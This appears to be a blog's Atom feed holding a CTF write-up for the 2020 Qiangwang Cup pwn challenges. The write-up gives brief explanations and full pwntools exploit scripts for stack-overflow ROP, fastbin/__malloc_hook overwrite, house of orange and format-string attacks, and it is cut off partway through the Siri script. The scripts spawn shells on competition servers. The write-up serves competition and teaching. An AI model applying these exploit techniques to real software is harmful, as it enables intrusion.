<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nocbtm&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nocbtm.github.io/"/>
  <updated>2020-09-01T12:47:37.000Z</updated>
  <id>https://nocbtm.github.io/</id>
  
  <author>
    <name>nocbtm</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020强网杯pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/30/2020%E5%BC%BA%E7%BD%91%E6%9D%AFpwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/30/2020强网杯pwn-wp/</id>
    <published>2020-08-30T11:25:19.000Z</published>
    <updated>2020-09-01T12:47:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。</p><p>最终48名，尽力了，没有进线下。</p><p><img alt="img" data-src="https://nocbtm.github.io/imgs/ISEE3DP466PG13.png" class="lozad"></p><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><p>leave_message 函数有栈溢出，先构造rop链泄漏libc_addr，然后再次溢出，构造systme(“/bin/sh”)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">pwn_name = <span class="string">"babymessage"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">21342</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"name:"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"message:"</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice"</span>, <span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name(p32(<span class="number">256</span>) + <span class="string">"\n"</span>)</span><br><span class="line">msg(<span class="string">"a"</span> * <span class="number">8</span> + p64(<span class="number">0x6010D0</span> + <span class="number">4</span>) + <span class="string">"b"</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x601038</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac1</span>) + p64(<span class="number">0x601038</span>) * <span class="number">2</span> +  p64(<span class="number">0x400670</span>)</span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0x40080A</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">read_libc = u64(p.recv(<span class="number">6</span>) + <span class="string">"\x00\x00"</span>)</span><br><span class="line">log.success(<span class="string">"0x%x"</span> %read_libc)</span><br><span class="line"></span><br><span class="line">libc_base = read_libc - <span class="number">0x110180</span></span><br><span class="line">log.success(<span class="string">"0x%x"</span> %libc_base)</span><br><span class="line">binsh = libc_base + <span class="number">0x1B40FA</span></span><br><span class="line">system_ = libc_base + <span class="number">0x4f4e0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x400ac3</span>) + p64(binsh) + p64(system_)</span><br><span class="line">p.sendafter(<span class="string">"message:"</span>, payload + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h2><p>free的时候idx可以输入负数，register时刚好输入的age就在chunk_list上面，先泄露出libc_addr和堆的地址，然后更新age为堆块的地址，即可造成堆块复用，然后用fatsbin attack 攻击<code>__malloc_hook</code>为onegadget即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"babynotes"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>, <span class="number">43121</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name,motto,age)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"name: \n"</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">"motto: \n"</span>,motto)</span><br><span class="line">    p.sendlineafter(<span class="string">"age: \n"</span>,str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'\n'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,<span class="number">0x66666666</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x3c4b78</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr=leak<span class="number">-0x230</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">choice(<span class="number">5</span>)</span><br><span class="line">register(<span class="string">"n"</span>*<span class="number">0x17</span>,<span class="string">"a"</span>*<span class="number">0x20</span>,heap_addr+<span class="number">0x1d0</span>)</span><br><span class="line">free(<span class="number">-3</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc.sym[<span class="string">"__malloc_hook"</span>]<span class="number">-0x23</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one[<span class="number">3</span>]+libc.address))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;df8791b3e5b410506265d92cd8396e59&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Just-a-Galgame"><a href="#Just-a-Galgame" class="headerlink" title="Just_a_Galgame"></a>Just_a_Galgame</h2><p>edit的时候没有检查idx，且有溢出，溢出修改top_chunk的size,需要满足内存页对齐，house of orange 攻击，会有free过后的unsorted bin ，再次申请小堆块，可泄漏libc_addr, 5功能可写入<code>__malloc_hook-0x60</code>的地址进行攻击，然后edit写入onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Just_a_Galgame"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">"123.56.170.202"</span>, <span class="number">52114</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span>  <span class="comment">#0x68</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,meg)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;"</span>,meg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">()</span>:</span> <span class="comment">#0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xd41</span>))</span><br><span class="line"></span><br><span class="line">add2()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ec2a0</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + <span class="number">0x3ebc30</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"5"</span>)</span><br><span class="line">p.send(p64(malloc_hook<span class="number">-0x60</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,p64(one[<span class="number">1</span>]+libc_base))</span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;145f2d9125917286c21df2bf470a8a81&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><p>sub_1212 里面很明显的格式化字符串，先泄露出libc_addr和ebp_addr，然后修改mian函数返回地址为onegadget，最终修改，sub_1212函数返回地址为main函数里面的leave ret，即可跳出while循环，劫持程序执行流为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Siri"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'123.56.170.202'</span>,<span class="number">12124</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">    p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span 